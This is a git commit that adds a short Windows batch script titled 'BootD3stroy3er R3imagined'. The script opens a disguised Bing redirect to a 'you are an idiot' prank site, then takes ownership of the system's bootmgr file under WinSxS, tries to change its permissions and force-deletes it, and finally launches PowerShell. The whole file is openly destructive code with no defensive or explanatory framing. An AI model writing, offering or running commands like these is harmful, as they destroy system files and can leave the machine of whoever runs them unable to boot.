551a4bbf7fe79afbd8434e45c80b48195cb90d70
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-11-23 21:07:14 -0700

    Add files via upload

---
+++ BootD3stroy3er R3imagined.bat
@@ -0,0 +1,9 @@
+@echo off
+start https://www.bing.com/ck/a?!&&p=809247a2bb806cd3fda746491e47ab7ea661f656ac2e3077ecc60b4168150ce8JmltdHM9MTc2Mzg1NjAwMA&ptn=3&ver=2&hsh=4&fclid=33fdd66f-5c32-6483-2fd2-c0c15d8e6534&psq=you+are+an+idioy&u=a1aHR0cHM6Ly95b3VhcmVhbmlkaW90Lnd6cTAyLnRvcC8
+takeown /f "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
+icacls "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
+del /r /s /q "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
+ start powershell
+
+
+
